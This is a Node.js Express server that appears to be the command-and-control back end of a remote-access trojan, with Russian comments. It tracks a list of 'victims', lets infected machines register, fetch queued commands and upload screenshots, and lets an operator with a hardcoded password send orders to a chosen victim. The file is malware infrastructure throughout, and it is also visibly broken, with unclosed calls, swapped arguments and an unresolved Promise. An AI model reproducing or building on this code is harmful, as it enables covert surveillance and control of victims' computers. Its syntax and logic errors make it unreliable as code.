const express = require('express')
const app = express()
const PORT  = process.env.PORT || 3000
const fs = require('fs')

const controlPassword = process.env.password || 'gAZan6742'

const mainFrontend = fs.readFileSync('./main.html', 'utf8')
const watchFrontend = fs.readFileSync('./watch.html', 'utf8')

let victims = []
//айди, пендинг реквестс, фотка, номер фотки

async function getPublicIpAddress() {
    try {
        const response = await fetch('https://ipify.org')
        const data = await response.json()
        console.log('Your Public IP Address:', data.ip)
        return data.ip
    } catch (error) {
        console.error('Error fetching public IP:', error)
        return '67.52.42.148'
    }
}

async function safeSend(res,req,data) {
  if (req.ip != selfIp) {
    res.send(data)
  }
}

async function safeJson(res,req,data,code) {
  if (req.ip != selfIp) {
    res.status(code).json(data)
  }
}

const selfIp = getPublicIpAddress()

app.post('/registerLox', async (req,res) => {
  if (req && req.body && req.body.uuid && typeof(req.body.uuid) === 'string') {
    victims.push({uuid: req.body.uuid, pendingTasks: [], currentPhoto: 'none', photoId: 0})
    safeJson(req,req,{'ok': true, 'msg': 'a')
  } else {
    safeJson(res,req,{'ok': false, 'msg': 'Твоя мать 200',200}
  }
})

app.get('/', async (req,res) => {
  safeSend(res,req,mainFrontend)
})

app.get('/watch', async (req,res) => {
  safeSend(res,req,watchFrontend)
})

app.get('/getMyTasks', async (req,res) => {
    if (req && req.body && req.body.uuid && typeof(req.body.uuid) === 'string') {
      const victim = victims.find(potentialVictim => potentialVictim.uuid === req.body.uuid)
      if (victim && victim.pendingTasks) {
        safeJson(res,req,{'ok': true, 'msg': 'a', tasks: [victim.pendingTasks]},200)
        victim.pendingTasks = []
      } else {
        safeJson(res,req,{'ok': false, 'msg': 'Жертва не найдена', tasks: []},200)
      }
    } else {
      safeJson(res,req,{'ok': false, 'msg': 'Твоя мать 200', tasks: []},200)
    }
})

app.post('/sendScreen', async (req,res) => {
    if (req && req.body && req.body.image && typeof(req.body.image) === 'string' && req.body.uuid && typeof(req.body.uuid) === 'string' && req.body.photoId && typeof(req.body.photoId) === 'number') {
      const victim = victims.find(potentialVictim => potentialVictim.uuid === req.body.uuid)
      if (victim && victim.photoId && victim.photoId < req.body.photoId) {
        victim.currentPhoto = req.body.image
        safeJson(res,req,{'ok': true, 'msg': 'a'},200)
      } else {
        safeJson(res,req,{'ok': false, 'msg': 'Жертва не найдена'},200)
      }
    } else {
      safeJson(res,req,{'ok': false, 'msg': 'Твоя мать 200'},200)
    }
})

app.get('/getScreen', async (req,res) => {
    if (req && req.body && req.body.uuid && typeof(req.body.uuid) == 'string') {
      const victim = victims.find(potentialVictim => potentialVictim.uuid === req.body.uuid)
      if (victim && victim.photoId) {
        safeSend(res,req,{ 'image': victim.photoId, 'imageId': victim.photoId, 'ok': true })
      } else {
       safeSend(res,req,{ 'image': 'none', 'imageId': 14, 'ok': false })
      }
    } else {
      safeSend(res,req,'пашол нахуи')
    }
})

app.post('/prikaz', async (req,res) => {
  if (req && req.body && req.body.password && typeof(req.body.password) === 'string' && req.body.password === controlPassword && req.body.prikaz && typeof(req.body.prikaz) === 'string' && req.body.victim && typeof(req.body.victim) === 'string') {
    const victim = victims.find(potentialVictim => potentialVictim.uuid === req.body.victim)
    if (victim) {
      victim.pendingTasks.push(req.body.prikaz)
      safeJson(res,req,{'ok': true, 'msg': 'a'},200)
    } else {
      safeJson(res,req,{'ok': false, 'msg': 'Жертва не найдена'},200)
    }
  } else {
    safeJson(res,req,{'ok': false, 'msg': 'Твоя мать 200'},200)
  }
})

app.listen(PORT)
